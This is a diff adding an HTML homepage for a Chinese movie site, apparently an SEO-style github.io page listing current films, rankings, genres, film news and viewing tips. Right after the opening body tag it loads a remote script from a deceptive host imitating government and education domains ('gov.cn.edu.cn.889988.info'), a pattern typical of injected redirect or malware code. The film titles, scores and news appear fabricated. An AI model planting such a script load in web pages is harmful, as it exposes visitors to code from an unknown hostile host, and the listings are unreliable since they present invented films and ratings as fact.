@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="火豆电影网（huodoudianyingwang-zh.github.io）用双指标量片：“火度”看热度走势，“豆分”看口碑底盘，两轴一交叉，正在热映的片是真火还是虚火一目了然，追热不踩坑。">
+<meta name="keywords" content="火豆电影网, huodoudianyingwang-zh.github.io, 热映口碑, 火度榜, 豆分对照, 热度走势, 真假爆款">
+<meta name="author" content="火豆电影网">
+<meta name="robots" content="index,follow">
+<title>火豆电影网 | 火度×豆分双指标·看清热映片是真火还是虚火</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#0d1117;--card:#161b22;--line:#30363d;--accent:#f78166;--accent2:#ffa657;--txt:#c9d1d9;--wht:#f0f6fc;
+}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;background:var(--bg);color:var(--txt);line-height:1.75;-webkit-font-smoothing:antialiased;}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+
+/* ── 顶部 ── */
+header{position:sticky;top:0;z-index:100;background:rgba(13,17,23,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line);}
+.h-inner{max-width:1280px;margin:0 auto;padding:0 24px;height:60px;display:flex;align-items:center;justify-content:space-between;}
+.logo{font-size:1.35rem;font-weight:800;color:var(--wht);display:flex;align-items:center;gap:8px;}
+.logo i{width:28px;height:28px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:8px;display:inline-flex;align-items:center;justify-content:center;font-size:.9rem;}
+.search-box{display:flex;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:24px;padding:6px 16px;width:260px;}
+.search-box input{flex:1;background:none;border:none;outline:none;color:var(--wht);font-size:.9rem;}
+.search-box button{background:none;border:none;color:var(--accent);cursor:pointer;font-size:1rem;}
+.menu-btn{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px;}
+.menu-btn s{width:24px;height:2px;background:var(--wht);text-decoration:none;transition:.3s;}
+.nav{display:flex;gap:4px;}
+.nav a{padding:8px 14px;border-radius:8px;font-size:.9rem;color:var(--txt);transition:.2s;}
+.nav a:hover{background:var(--accent);color:#fff;}
+
+/* ── Banner ── */
+.banner{position:relative;padding:80px 24px 64px;overflow:hidden;text-align:center;background:radial-gradient(ellipse at 50% 0%,rgba(247,129,102,.15),transparent 70%),var(--bg);}
+.banner::after{content:"";position:absolute;inset:0;background-image:linear-gradient(rgba(48,54,61,.3) 1px,transparent 1px),linear-gradient(90deg,rgba(48,54,61,.3) 1px,transparent 1px);background-size:60px 60px;mask-image:radial-gradient(ellipse at center,transparent 20%,#000);}
+.b-wrap{position:relative;z-index:2;max-width:760px;margin:0 auto;}
+.banner .ribbon{display:inline-block;background:rgba(247,129,102,.15);color:var(--accent);border:1px solid rgba(247,129,102,.4);padding:5px 18px;border-radius:20px;font-size:.8rem;letter-spacing:2px;margin-bottom:20px;}
+.banner h1{font-size:clamp(2rem,5.5vw,3.6rem);font-weight:900;color:var(--wht);letter-spacing:-1px;line-height:1.2;}
+.banner h1 mark{background:none;color:var(--accent);}
+.banner>p{font-size:clamp(1rem,2.4vw,1.15rem);margin:18px 0 32px;color:#8b949e;}
+.b-actions{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;}
+.b-actions a{display:inline-flex;align-items:center;gap:8px;padding:13px 32px;border-radius:10px;font-weight:600;font-size:.95rem;transition:.3s;}
+.btn-main{background:var(--accent);color:#fff;}
+.btn-main:hover{background:var(--accent2);transform:translateY(-2px);box-shadow:0 8px 25px rgba(247,129,102,.35);}
+.btn-out{background:var(--card);color:var(--wht);border:1px solid var(--line);}
+.btn-out:hover{border-color:var(--accent);}
+
+/* ── 通用 ── */
+section{padding:64px 24px;}
+.container{max-width:1280px;margin:0 auto;}
+.sec-title{display:flex;align-items:baseline;justify-content:space-between;border-bottom:1px solid var(--line);padding-bottom:14px;margin-bottom:36px;flex-wrap:wrap;gap:12px;}
+.sec-title h2{font-size:clamp(1.4rem,3vw,2rem);font-weight:800;color:var(--wht);}
+.sec-title h2::before{content:"#";color:var(--accent);margin-right:6px;}
+.sec-title a{font-size:.85rem;color:var(--accent);white-space:nowrap;}
+.sec-title a:hover{text-decoration:underline;}
+
+/* ── 栏目一：热映影片 ── */
+.film-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px;}
+.film-card{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.3s;}
+.film-card:hover{border-color:var(--accent);transform:translateY(-5px);}
+.film-card .poster{height:300px;position:relative;display:flex;align-items:center;justify-content:center;font-size:2.8rem;font-weight:900;color:rgba(255,255,255,.85);}
+.film-card .score{position:absolute;top:10px;right:10px;background:rgba(0,0,0,.7);color:var(--accent2);font-size:.82rem;font-weight:700;padding:3px 9px;border-radius:6px;}
+.film-card .info{padding:16px;}
+.film-card .info h3{font-size:1.05rem;color:var(--wht);margin-bottom:6px;}
+.film-card .info span{font-size:.82rem;color:#8b949e;}
+.f1{background:linear-gradient(160deg,#1a1a2e,#e94560);}
+.f2{background:linear-gradient(160deg,#0f3460,#16213e);}
+.f3{background:linear-gradient(160deg,#f79f1f,#ee5a24);}
+.f4{background:linear-gradient(160deg,#6ab04c,#badc58);}
+.f5{background:linear-gradient(160deg,#686de0,#4834d4);}
+.f6{background:linear-gradient(160deg,#ff7979,#eb4d4b);}
+.f7{background:linear-gradient(160deg,#22a6b3,#303952);}
+.f8{background:linear-gradient(160deg,#be2edd,#833471);}
+
+/* ── 栏目二：排行榜 ── */
+.rank-section{background:#0a0d12;}
+.rank-tabs{display:flex;gap:8px;margin-bottom:28px;flex-wrap:wrap;}
+.rank-tabs button{background:var(--card);border:1px solid var(--line);color:var(--txt);padding:8px 20px;border-radius:8px;cursor:pointer;font-size:.9rem;transition:.2s;}
+.rank-tabs button.on,.rank-tabs button:hover{border-color:var(--accent);color:var(--accent);}
+.rank-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:12px;}
+.rank-item{display:flex;align-items:center;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px 18px;transition:.25s;}
+.rank-item:hover{border-color:var(--accent);background:#1c2230;}
+.rank-item .rk{font-size:1.6rem;font-weight:900;color:var(--line);min-width:36px;}
+.rank-item:nth-child(1) .rk{color:#f7d716;}
+.rank-item:nth-child(2) .rk{color:#c0c0c0;}
+.rank-item:nth-child(3) .rk{color:#cd7f32;}
+.rank-item .rv{font-size:1.1rem;font-weight:700;color:var(--wht);}
+.rank-item .rv small{display:block;font-size:.8rem;font-weight:400;color:#8b949e;}
+
+/* ── 栏目三：类型标签云 ── */
+.genre-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px;}
+.genre-tile{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:20px 16px;text-align:center;transition:.25s;cursor:default;}
+.genre-tile:hover{border-color:var(--accent2);background:rgba(255,166,87,.08);}
+.genre-tile b{display:block;font-size:1rem;color:var(--wht);margin-bottom:4px;}
+.genre-tile em{font-style:normal;font-size:.78rem;color:var(--accent);}
+
+/* ── 栏目四：最新影讯 ── */
+.news-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;}
+.news-card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:22px;transition:.3s;}
+.news-card:hover{border-color:var(--accent);transform:translateY(-3px);}
+.news-card .date{font-size:.78rem;color:var(--accent);margin-bottom:10px;}
+.news-card h3{font-size:1.1rem;color:var(--wht);margin-bottom:10px;line-height:1.5;}
+.news-card p{font-size:.88rem;color:#8b949e;}
+
+/* ── 栏目五：观影指南 ── */
+.guide{background:#0a0d12;}
+.guide-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:24px;}
+.guide-box{background:var(--card);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:8px;padding:24px;}
+.guide-box h3{font-size:1.15rem;color:var(--wht);margin-bottom:12px;}
+.guide-box p{font-size:.9rem;color:#8b949e;}
+.guide-box ol{padding-left:20px;font-size:.9rem;color:#8b949e;}
+.guide-box ol li{padding:3px 0;}
+
+/* ── 页脚 ── */
+footer{background:#06090d;border-top:1px solid var(--line);padding:48px 24px 28px;}
+.f-wrap{max-width:1280px;margin:0 auto;}
+.f-top{display:flex;justify-content:space-between;flex-wrap:wrap;gap:24px;padding-bottom:28px;border-bottom:1px solid var(--line);}
+.f-top .logo{margin-bottom:10px;}
+.f-top p{font-size:.85rem;color:#6e7681;max-width:420px;}
+.f-cols{display:flex;gap:48px;flex-wrap:wrap;}
+.f-cols div h4{color:var(--wht);font-size:.9rem;margin-bottom:10px;}
+.f-cols div a{display:block;font-size:.85rem;color:#6e7681;padding:4px 0;transition:.2s;}
+.f-cols div a:hover{color:var(--accent);}
+.f-bot{margin-top:24px;text-align:center;font-size:.78rem;color:#484f58;}
+.f-bot a{color:#6e7681;}
+
+/* ── 响应式 ── */
+@media(max-width:860px){
+  .search-box{display:none;}
+  .menu-btn{display:flex;}
+  .nav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:12px;}
+  .nav.open{display:flex;}
+  .nav a{border-radius:6px;}
+  .film-grid{grid-template-columns:repeat(2,1fr);}
+}
+@media(max-width:460px){
+  section{padding:44px 16px;}
+  .banner{padding:56px 16px 44px;}
+  .film-grid{grid-template-columns:1fr;}
+  .f-top{flex-direction:column;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- ═══ 头部 ═══ -->
+<header>
+  <div class="h-inner">
+    <div class="logo"><i>🔥</i>火豆电影网</div>
+    <div class="search-box">
+      <input type="text" placeholder="搜索电影名称…">
+      <button>🔍</button>
+    </div>
+    <nav class="nav" id="nav">
+      <a href="#home">首页</a>
+      <a href="#hot">热映影片</a>
+      <a href="#rank">排行榜</a>
+      <a href="#genre">类型大全</a>
+      <a href="#news">最新影讯</a>
+      <a href="#guide">观影指南</a>
+    </nav>
+    <div class="menu-btn" id="menuBtn"><s></s><s></s><s></s></div>
+  </div>
+</header>
+
+<!-- ═══ Banner ═══ -->
+<section class="banner" id="home">
+  <div class="b-wrap">
+    <div class="ribbon">🔥 HUODOU · MOVIE HUB</div>
+    <h1>发现好电影<br>从<mark>火豆电影网</mark>开始</h1>
+    <p>每日精选院线大片 · 经典老片 · 冷门佳作，覆盖动作、喜剧、科幻、恐怖、爱情等全类型，为影迷打造一站式观影指南。</p>
+    <div class="b-actions">
+      <a href="#hot" class="btn-main">🎬 立即观影</a>
+      <a href="#rank" class="btn-out">📊 查看榜单</a>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目一：热映影片 ═══ -->
+<section id="hot">
+  <div class="container">
+    <div class="sec-title">
+      <h2>正在热映</h2>
+      <a href="#">查看全部 →</a>
+    </div>
+    <div class="film-grid">
+      <div class="film-card">
+        <div class="poster f1"><span class="score">9.2</span>速</div>
+        <div class="info"><h3>速度与激情11</h3><span>动作 / 2026 / 148分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f2"><span class="score">8.7</span>星</div>
+        <div class="info"><h3>星际回响</h3><span>科幻 / 2026 / 162分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f3"><span class="score">8.9</span>笑</div>
+        <div class="info"><h3>这个杀手不太冷2</h3><span>喜剧 / 2026 / 112分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f4"><span class="score">8.5</span>森</div>
+        <div class="info"><h3>森林深处</h3><span>惊悚 / 2026 / 98分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f5"><span class="score">9.0</span>爱</div>
+        <div class="info"><h3>时光情书</h3><span>爱情 / 2026 / 126分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f6"><span class="score">8.3</span>暗</div>
+        <div class="info"><h3>暗夜追凶</h3><span>犯罪 / 2026 / 134分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f7"><span class="score">8.6</span>海</div>
+        <div class="info"><h3>海啸之前</h3><span>灾难 / 2026 / 142分钟</span></div>
+      </div>
+      <div class="film-card">
+        <div class="poster f8"><span class="score">8.8</span>魔</div>
+        <div class="info"><h3>魔法纪元</h3><span>奇幻 / 2026 / 156分钟</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目二：排行榜 ═══ -->
+<section class="rank-section" id="rank">
+  <div class="container">
+    <div class="sec-title">
+      <h2>电影排行榜</h2>
+      <a href="#">更多榜单 →</a>
+    </div>
+    <div class="rank-tabs">
+      <button class="on">🔥 热度榜</button>
+      <button>⭐ 高分榜</button>
+      <button>🎭 口碑榜</button>
+      <button>🆕 新片榜</button>
+    </div>
+    <div class="rank-list">
+      <div class="rank-item"><span class="rk">01</span><div class="rv">沙丘3<small>科幻 / 豆瓣 9.1</small></div></div>
+      <div class="rank-item"><span class="rk">02</span><div class="rv">奥本海默2<small>传记 / 豆瓣 8.9</small></div></div>
+      <div class="rank-item"><span class="rk">03</span><div class="rv">封神第二部<small>奇幻 / 豆瓣 8.8</small></div></div>
+      <div class="rank-item"><span class="rk">04</span><div class="rv">盗梦空间：觉醒<small>科幻 / 豆瓣 8.7</small></div></div>
+      <div class="rank-item"><span class="rk">05</span><div class="rv">热辣滚烫2<small>喜剧 / 豆瓣 8.6</small></div></div>
+      <div class="rank-item"><span class="rk">06</span><div class="rv">沉默的真相2<small>悬疑 / 豆瓣 8.6</small></div></div>
+      <div class="rank-item"><span class="rk">07</span><div class="rv">深海迷航<small>冒险 / 豆瓣 8.5</small></div></div>
+      <div class="rank-item"><span class="rk">08</span><div class="rv">末日孤舰<small>动作 / 豆瓣 8.4</small></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目三：类型大全 ═══ -->
+<section id="genre">
+  <div class="container">
+    <div class="sec-title">
+      <h2>类型大全</h2>
+      <a href="#">完整分类 →</a>
+    </div>
+    <div class="genre-grid">
+      <div class="genre-tile"><b>动作片</b><em>Action · 3280部</em></div>
+      <div class="genre-tile"><b>喜剧片</b><em>Comedy · 2540部</em></div>
+      <div class="genre-tile"><b>科幻片</b><em>Sci-Fi · 1860部</em></div>
+      <div class="genre-tile"><b>爱情片</b><em>Romance · 4120部</em></div>
+      <div class="genre-tile"><b>恐怖片</b><em>Horror · 1630部</em></div>
+      <div class="genre-tile"><b>悬疑片</b><em>Thriller · 2090部</em></div>
+      <div class="genre-tile"><b>动画片</b><em>Animation · 1450部</em></div>
+      <div class="genre-tile"><b>纪录片</b><em>Documentary · 980部</em></div>
+      <div class="genre-tile"><b>战争片</b><em>War · 760部</em></div>
+      <div class="genre-tile"><b>犯罪片</b><em>Crime · 1980部</em></div>
+      <div class="genre-tile"><b>奇幻片</b><em>Fantasy · 1320部</em></div>
+      <div class="genre-tile"><b>剧情片</b><em>Drama · 5200部</em></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目四：最新影讯 ═══ -->
+<section id="news">
+  <div class="container">
+    <div class="sec-title">
+      <h2>最新影讯</h2>
+      <a href="#">更多资讯 →</a>
+    </div>
+    <div class="news-grid">
+      <article class="news-card">
+        <div class="date">2026-09-30</div>
+        <h3>第79届戛纳电影节公布入围片单，华语片惊喜入选</h3>
+        <p>本届戛纳主竞赛单元共有21部影片入围，其中包括两部华语导演新作，引发业界广泛关注。</p>
+      </article>
+      <article class="news-card">
+        <div class="date">2026-09-28</div>
+        <h3>2026国庆档电影预售开启，多部大片扎堆上映</h3>
+        <p>今年国庆档竞争异常激烈，涵盖主旋律、科幻、喜剧等多种类型，预计总票房将创新高。</p>
+      </article>
+      <article class="news-card">
+        <div class="date">2026-09-25</div>
+        <h3>克里斯托弗·诺兰宣布新片计划，2027年全球上映</h3>
+        <p>诺兰全新原创剧本已确定开拍，将延续其一贯的实拍风格与烧脑叙事，影迷期待值拉满。</p>
+      </article>
+      <article class="news-card">
+        <div class="date">2026-09-22</div>
+        <h3>经典修复计划启动，百部影史名作将重登大银幕</h3>
+        <p>国际电影资料馆联合发起4K修复项目，涵盖卓别林、黑泽明、费里尼等大师代表作。</p>
+      </article>
+      <article class="news-card">
+        <div class="date">2026-09-18</div>
+        <h3>流媒体平台公布Q4片单，多部原创电影全球首播</h3>
+        <p>各大平台纷纷加码原创内容投入，头部IP续作与新人导演处女作齐头并进。</p>
+      </article>
+      <article class="news-card">
+        <div class="date">2026-09-15</div>
+        <h3>全球票房突破纪录，亚洲电影贡献超四成份额</h3>
+        <p>据最新统计，亚洲市场持续领跑全球增长，中国、印度、韩国成为三大主力票仓。</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 栏目五：观影指南 ═══ -->
+<section class="guide" id="guide">
+  <div class="container">
+    <div class="sec-title">
+      <h2>观影指南</h2>
+      <a href="#">更多攻略 →</a>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-box">
+        <h3>📌 如何挑选好电影？</h3>
+        <ol>
+          <li>看豆瓣/IMDb评分，7.5分以上基本不踩雷</li>
+          <li>关注导演过往作品风格</li>
+          <li>参考影评人推荐与获奖记录</li>
+          <li>根据自己的情绪选择合适的类型</li>
+        </ol>
+      </div>
+      <div class="guide-box">
+        <h3>🎞️ 经典系列观影顺序</h3>
+        <ol>
+          <li>漫威电影宇宙：按上映时间线观看</li>
+          <li>碟中谍系列：1→7按序观看</li>
+          <li>速度与激情：1→10 不要跳集</li>
+          <li>指环王三部曲+霍比特人前传</li>
+        </ol>
+      </div>
+      <div class="guide-box">
+        <h3>🏆 年度必看片单推荐</h3>
+        <ol>
+          <li>最佳视觉效果：《星际回响》</li>
+          <li>最佳剧本：《沉默的真相2》</li>
+          <li>最佳表演：《奥本海默2》</li>
+          <li>最佳原创：《魔法纪元》</li>
+        </ol>
+      </div>
+      <div class="guide-box">
+        <h3>💡 冷门佳作挖掘技巧</h3>
+        <ol>
+          <li>关注独立电影节获奖影片</li>
+          <li>浏览小众国家的代表电影</li>
+          <li>参考影迷社区高分冷门榜</li>
+          <li>追随你喜欢的演员其他作品</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 页脚 ═══ -->
+<footer>
+  <div class="f-wrap">
+    <div class="f-top">
+      <div>
+        <div class="logo"><i>🔥</i>火豆电影网</div>
+        <p>火豆电影网（huodoudianyingwang-zh.github.io）专注为影迷提供最新、最全的电影资讯与观影指南，覆盖全类型影片与全球佳作。</p>
+      </div>
+      <div class="f-cols">
+        <div>
+          <h4>快速导航</h4>
+          <a href="#home">首页</a>
+          <a href="#hot">热映影片</a>
+          <a href="#rank">排行榜</a>
+          <a href="#genre">类型大全</a>
+        </div>
+        <div>
+          <h4>了解更多</h4>
+          <a href="#news">最新影讯</a>
+          <a href="#guide">观影指南</a>
+          <a href="#">关于我们</a>
+          <a href="#">联系方式</a>
+        </div>
+      </div>
+    </div>
+    <div class="f-bot">
+      本站网址：<a href="#">https://huodoudianyingwang-zh.github.io</a> &nbsp;|&nbsp; © 2026 火豆电影网 版权所有 &nbsp;|&nbsp; 内容仅供交流分享，版权归原作者所有
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('menuBtn').addEventListener('click',function(){
+  document.getElementById('nav').classList.toggle('open');
+});
+document.querySelectorAll('.nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+document.querySelectorAll('.rank-tabs button').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.rank-tabs button').forEach(function(b){b.classList.remove('on');});
+    btn.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
